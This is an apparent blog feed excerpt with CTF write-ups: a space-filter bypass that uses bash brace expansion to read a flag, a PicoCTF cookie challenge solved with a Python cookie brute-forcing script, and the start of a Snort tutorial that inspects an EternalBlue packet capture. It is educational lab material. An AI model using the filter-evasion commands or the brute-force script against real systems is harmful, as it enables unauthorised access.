&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;,&amp;lt;arguments&amp;gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Example:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;,-al&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;,-al&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
total 32
dr-xr-xr-x 1 nobody nogroup  4096 Sep  9 19:47 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 1 user   user     4096 Sep  9 19:47 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 nobody nogroup   220 Sep  9 19:47 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 user   user    12283 Sep  9 19:47 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 nobody nogroup   807 Sep  9 19:47 .profile
drwxr-xr-x 1 user   user     4096 Sep  9 19:47 just
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, let’s us navigate to the flag utilizing the same technique …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;,-al,just/out/of/reach&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;,-al,just/out/of/reach&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
total 12
drwxr-xr-x 1 user user 4096 Sep  9 19:47 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 1 user user 4096 Sep  9 19:47 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 user user   38 Sep  9 19:47 flag.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and we can easily read the flag …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@host:/home/user&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;,just/out/of/reach/flag.txt&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;,just/out/of/reach/flag.txt&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
flag&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;2d43e30[&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;REDACTED&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;7a9cbbe98&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="ctf" /><category term="challenge" /><category term="miscellaneous" /><summary type="html">Description</summary></entry><entry><title type="html">Cookies - PicoCTF</title><link href="https://jayngng.github.io/blog/cookies-picoctf/" rel="alternate" type="text/html" title="Cookies - PicoCTF" /><published>2021-09-15T19:10:52+10:00</published><updated>2021-09-15T19:10:52+10:00</updated><id>https://jayngng.github.io/blog/cookies---picoctf</id><content type="html" xml:base="https://jayngng.github.io/blog/cookies-picoctf/">&lt;h2 id=&quot;description&quot;&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; madStacks&lt;/p&gt;

&lt;p&gt;Who doesn’t love cookies? Try to figure out the best one.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://mercury.picoctf.net:54219
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;solution&quot;&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Let’s us enumerate the target website by sending a random word for the cookie input.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/cookies/cookie1.png&quot; title=&quot;cookies/cookie1.png&quot; alt=&quot;cookies/cookie1.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;→ The output returns an invalid cookie.&lt;/p&gt;

&lt;p&gt;Now, let’s us inspect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Storage&lt;/code&gt; tab of the Developer Tool, where cookies are stored.&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/cookies/dev_cookie.png&quot; title=&quot;cookies/dev_cookie.png&quot; alt=&quot;cookies/dev_cookie.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;The value is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-1&lt;/code&gt;, what if we modify the value to a positive number?! …&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/cookies/valid_cookie.png&quot; title=&quot;cookies/valid_cookie.png&quot; alt=&quot;cookies/valid_cookie.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;By modifying value, we successfull pull a random cookie from the website. To effectively enumerate the flag, we use the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; script.&lt;/p&gt;

&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://mercury.picoctf.net:54219/check&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;name&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;picoCTF{&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Trying cookie: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Primarily, the script will detect a “weird” cookie (flag) for us.&lt;/p&gt;

&lt;p&gt;On our terminal, we execute …&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 cookie_brute.py
Trying cookie: 0
Trying cookie: 1
Trying cookie: 2
...
picoCTF&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;3v3ry1_l0v3s_c00k135_96cdadfd&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><category term="picogym" /><category term="ctf" /><category term="web" /><summary type="html">Description</summary></entry><entry><title type="html">Traffic Analysis with Snort</title><link href="https://jayngng.github.io/blog/snort-packet-inspector/" rel="alternate" type="text/html" title="Traffic Analysis with Snort" /><published>2021-09-14T05:40:23+10:00</published><updated>2021-09-14T05:40:23+10:00</updated><id>https://jayngng.github.io/blog/snort---packet-inspector</id><content type="html" xml:base="https://jayngng.github.io/blog/snort-packet-inspector/">&lt;h2 id=&quot;overview&quot;&gt;&lt;strong&gt;Overview&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In this post, we will focus on writing Snort rules to detect real-world attacks based on inspecting and analyzing malicious traffic.&lt;/p&gt;

&lt;h5 id=&quot;tools-used&quot;&gt;&lt;strong&gt;Tools used&lt;/strong&gt;:&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wireshark&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Snort&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;introduction-to-snort&quot;&gt;&lt;strong&gt;Introduction to Snort&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Snort is an open source &lt;strong&gt;IDS&lt;/strong&gt; and &lt;strong&gt;IPS&lt;/strong&gt;, it can be used as &lt;strong&gt;packet sniffer&lt;/strong&gt; or &lt;strong&gt;packet logger&lt;/strong&gt;. With a set of rules, Snort can inspect all traffic and link malicious traffic that match the rules. Depending on the rule, Snort is able to prevent or log the traffic.&lt;/p&gt;

&lt;p&gt;Another powerful function of Snort is &lt;strong&gt;custom rules&lt;/strong&gt;. Primarily, those rules allow users to monitor traffic in a more flexible way.&lt;/p&gt;

&lt;p&gt;Let’s us see how to create custom rules in the next sections.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;detect-icmp-request--reply-with-snort&quot;&gt;&lt;strong&gt;Detect ICMP request &amp;amp; reply with Snort&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We start with locating the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local.rules&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;locate local.rules
/etc/nsm/rules/local.rules
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local.rules&lt;/code&gt; file is a compilation of custom rules, where we’ll utilize to write our own rules.&lt;/p&gt;

&lt;p&gt;Generally, our rule will look like the following:&lt;/p&gt;

&lt;div class=&quot;row imager__plugin&quot;&gt;
            &lt;img class=&quot;img-fluid mx-auto d-block&quot; src=&quot;/assets/images/posts/snort/rule_overview.png&quot; title=&quot;snort/rule_overview.png&quot; alt=&quot;snort/rule_overview.png&quot; /&gt;
          &lt;/div&gt;

&lt;p&gt;It’s very simple to detect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ICMP request or reply&lt;/code&gt;. By default, Snort offers the ability to parse the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;icmp&lt;/code&gt; protocol in Snort rule.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert icmp any any -&amp;gt; 192.168.1.0/24 any (msg:&quot;ICMP detect!&quot;; sid:10000001; rev:1;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s apply the rule against a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;icmp.pcap&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;snort &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--daq&lt;/span&gt; pcap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; console &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /etc/nsm/rules/local.rules &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; icmp.pcap
02/21-22:25:18.329311  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 213.16.246.5 -&amp;gt; 192.168.1.2
02/21-22:25:20.717067  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.2 -&amp;gt; 192.168.1.6
02/21-22:25:20.717109  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6 -&amp;gt; 192.168.1.2
02/21-22:25:21.395044  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6 -&amp;gt; 192.168.1.2
02/21-22:25:21.722816  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.2 -&amp;gt; 192.168.1.6
02/21-22:25:21.722845  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6 -&amp;gt; 192.168.1.2
02/21-22:25:22.729727  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.2 -&amp;gt; 192.168.1.6
02/21-22:25:22.729760  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1:10000001:1] ICMP detect! &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Priority: 0] &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ICMP&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 192.168.1.6 -&amp;gt; 192.168.1.2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Just like that, we successfully detect the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ICMP&lt;/code&gt; packets.&lt;/p&gt;

&lt;h4 id=&quot;detect-buffer-overflow-attack-with-snort&quot;&gt;&lt;strong&gt;Detect Buffer Overflow attack with Snort&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Typically, a &lt;strong&gt;Buffer Overflow&lt;/strong&gt; attack will contain a large number of “A” letters.&lt;/p&gt;

&lt;p&gt;Let’s us see that in action utilizing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcpdump&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tcpdump &lt;span class=&quot;nt&quot;&gt;-nntttt&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; eternalblue.pcap &lt;span class=&quot;s2&quot;&gt;&quot;port 445 and src 192.168.1.6 and greater 1000&quot;&lt;/span&gt;
...
2019-02-22 17:13:34.451071 IP 192.168.1.6.55018 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 192.168.1.4.445: Flags &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;P.], &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;2112:6268, ack 40, win 237, options &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;nop,nop,TS val 325529 ecr 38791], length 4156                         
E..p..@.@.%....................&lt;span class=&quot;nv&quot;&gt;$.&lt;/span&gt;..........                                                                                                                                                   
...........8.SMB3......H....................    ............8.................................................................................................................................
..............................................................................................................................................................................................
..............................................................................................................................................................................................
..............................................................................................................................................................................................
..............................................................................................................................................................................................
.................................................................................................................................AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
